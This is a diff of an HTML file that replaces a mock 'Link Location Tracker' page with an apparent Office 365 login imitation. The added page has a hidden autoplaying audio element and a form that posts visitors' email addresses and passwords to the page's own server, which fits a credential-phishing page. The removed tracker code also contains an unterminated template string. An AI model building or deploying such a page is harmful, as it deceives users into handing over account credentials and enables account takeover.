@@ -2,233 +2,56 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Link Location Tracker</title>
-    <script src="https://cdn.tailwindcss.com"></script>
+    <title>Login Office</title>
     <style>
-        .map-container {
-            position: relative;
-            height: 300px;
-            overflow: hidden;
-            border-radius: 0.5rem;
-            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
+        body {
+            background-image: url("/static/background.jpg");
+            background-size: cover;
+            font-family: Arial, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            color: white;
+            flex-direction: column;
         }
-        
-        .spinner {
-            display: none;
-            width: 40px;
-            height: 40px;
-            border: 4px solid rgba(0, 0, 0, 0.1);
-            border-radius: 50%;
-            border-top: 4px solid #3b82f6;
-            animation: spin 1s linear infinite;
+
+        .login-box {
+            background: rgba(0,0,0,0.6);
+            padding: 30px;
+            border-radius: 10px;
         }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+
+        input {
+            margin: 10px 0;
+            padding: 10px;
+            width: 250px;
+            border: none;
+            border-radius: 5px;
         }
-        
-        .info-card {
-            transition: all 0.3s ease;
-        }
-        
-        .info-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1);
+
+        button {
+            padding: 10px;
+            width: 270px;
+            background: #0078d4;
+            border: none;
+            color: white;
+            border-radius: 5px;
         }
     </style>
 </head>
-<body class="bg-gray-50 min-h-screen">
-    <div class="container mx-auto px-4 py-12">
-        <!-- Header Section -->
-        <header class="text-center mb-12">
-            <h1 class="text-4xl font-bold text-gray-800 mb-2">Link Location Tracker</h1>
-            <p class="text-gray-600 max-w-2xl mx-auto">Enter any URL below to track its server location and network information</p>
-        </header>
-        
-        <!-- Main Content -->
-        <main class="max-w-4xl mx-auto">
-            <!-- URL Input Section -->
-            <div class="bg-white rounded-xl shadow-md p-6 mb-8">
-                <div class="flex flex-col md:flex-row gap-4">
-                    <input 
-                        type="text" 
-                        id="urlInput" 
-                        placeholder="https://example.com" 
-                        class="flex-grow px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all"
-                    >
-                    <button 
-                        id="trackBtn" 
-                        class="px-6 py-3 bg-blue-600 text-white font-medium rounded-lg hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 transition-colors"
-                    >
-                        Track Location
-                    </button>
-                </div>
-                
-                <div class="flex justify-center mt-4">
-                    <div id="loadingSpinner" class="spinner"></div>
-                </div>
-            </div>
-            
-            <!-- Results Section (Initially Hidden) -->
-            <div id="resultsSection" class="hidden">
-                <!-- Domain Info Card -->
-                <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
-                    <div class="info-card bg-white rounded-xl shadow-md p-6">
-                        <h3 class="text-xl font-semibold text-gray-800 mb-4">Domain Information</h3>
-                        <div class="space-y-3">
-                            <div>
-                                <p class="text-sm text-gray-500">URL</p>
-                                <p id="domainUrl" class="font-medium">-</p>
-                            </div>
-                            <div>
-                                <p class="text-sm text-gray-500">IP Address</p>
-                                <p id="ipAddress" class="font-medium">-</p>
-                            </div>
-                            <div>
-                                <p class="text-sm text-gray-500">Host Provider</p>
-                                <p id="hostProvider" class="font-medium">-</p>
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <!-- Location Card -->
-                    <div class="info-card bg-white rounded-xl shadow-md p-6">
-                        <h3 class="text-xl font-semibold text-gray-800 mb-4">Location Details</h3>
-                        <div class="space-y-3">
-                            <div>
-                                <p class="text-sm text-gray-500">Country</p>
-                                <p id="country" class="font-medium">-</p>
-                            </div>
-                            <div>
-                                <p class="text-sm text-gray-500">Region</p>
-                                <p id="region" class="font-medium">-</p>
-                            </div>
-                            <div>
-                                <p class="text-sm text-gray-500">City</p>
-                                <p id="city" class="font-medium">-</p>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-                
-                <!-- Map Visualization -->
-                <div class="bg-white rounded-xl shadow-md p-6 mb-6">
-                    <h3 class="text-xl font-semibold text-gray-800 mb-4">Approximate Location</h3>
-                    <div class="map-container">
-                        <img 
-                            id="locationMap" 
-                            src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/741ac862-a522-4c00-960d-4dc694a51d87.png" 
-                            alt="Map showing the geographic location of https://example.com with overlay markers and location data"
-                            class="w-full h-full object-cover"
-                        />
-                    </div>
-                </div>
-                
-                <!-- Technical Details -->
-                <div class="bg-white rounded-xl shadow-md p-6">
-                    <h3 class="text-xl font-semibold text-gray-800 mb-4">Technical Information</h3>
-                    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
-                        <div>
-                            <p class="text-sm text-gray-500">ISP</p>
-                            <p id="isp" class="font-medium">-</p>
-                        </div>
-                        <div>
-                            <p class="text-sm text-gray-500">AS Number</p>
-                            <p id="asNumber" class="font-medium">-</p>
-                        </div>
-                        <div>
-                            <p class="text-sm text-gray-500">Timezone</p>
-                            <p id="timezone" class="font-medium">-</p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </main>
-        
-        <!-- Footer -->
-        <footer class="mt-16 text-center text-gray-500 text-sm">
-            <p>Disclaimer: Location data is approximate and based on IP geolocation</p>
-        </footer>
-    </div>
+<body>
+    <audio autoplay hidden>
+        <source src="/static/sound.mp3" type="audio/mpeg">
+    </audio>
 
-    <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            const trackBtn = document.getElementById('trackBtn');
-            const urlInput = document.getElementById('urlInput');
-            const loadingSpinner = document.getElementById('loadingSpinner');
-            const resultsSection = document.getElementById('resultsSection');
-            
-            trackBtn.addEventListener('click', trackLink);
-            urlInput.addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') trackLink();
-            });
-            
-            function trackLink() {
-                const url = urlInput.value.trim();
-                
-                if (!url) {
-                    alert('Please enter a valid URL');
-                    return;
-                }
-                
-                // Show loading state
-                loadingSpinner.style.display = 'block';
-                resultsSection.classList.add('hidden');
-                
-                // Simulate API call to a geolocation service
-                setTimeout(() => {
-                    // In a real implementation, this would be an actual API call to a service like ipapi.co or ipgeolocation.io
-                    simulateGeolocationResponse(url);
-                    
-                    // Hide loading and show results
-                    loadingSpinner.style.display = 'none';
-                    resultsSection.classList.remove('hidden');
-                }, 1500);
-            }
-            
-            function simulateGeolocationResponse(url) {
-                try {
-                    // Extract domain from URL
-                    const domain = new URL(url.includes('://') ? url : `https://${url}`).hostname;
-                    
-                    // Simulated response data
-                    const mockData = {
-                        ip: '203.0.113.45',
-                        domain: domain,
-                        country: 'United States',
-                        region: 'California',
-                        city: 'San Francisco',
-                        isp: 'Cloudflare, Inc.',
-                        as: 'AS13335 Cloudflare, Inc.',
-                        timezone: 'America/Los_Angeles',
-                        latitude: 37.7749,
-                        longitude: -122.4194
-                    };
-                    
-                    // Update UI with simulated data
-                    document.getElementById('domainUrl').textContent = domain;
-                    document.getElementById('ipAddress').textContent = mockData.ip;
-                    document.getElementById('country').textContent = mockData.country;
-                    document.getElementById('region').textContent = mockData.region;
-                    document.getElementById('city').textContent = mockData.city;
-                    document.getElementById('hostProvider').textContent = 'Cloudflare';
-                    document.getElementById('isp').textContent = mockData.isp;
-                    document.getElementById('asNumber').textContent = mockData.as;
-                    document.getElementById('timezone').textContent = mockData.timezone;
-                    
-                    // Update map (using placeholder service - in real app you'd use Google Maps or Mapbox)
-                    document.getElementById('locationMap').src = `https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/abbb627d-2286-44f4-af84-da696271fa89.png
-                    document.getElementById('locationMap').alt = `Map visualization showing approximate location in ${mockData.city}, ${mockData.region}, ${mockData.country}`;
-                    
-                } catch (error) {
-                    alert('Invalid URL provided. Please include http:// or https://');
-                    loadingSpinner.style.display = 'none';
-                }
-            }
-        });
-    </script>
+    <div class="login-box">
+        <h2>Login Office 365</h2>
+        <form method="POST">
+            <input type="email" name="email" placeholder="Email" required><br>
+            <input type="password" name="password" placeholder="Password" required><br>
+            <button type="submit">Login</button>
+        </form>
+    </div>
 </body>
 </html>
-
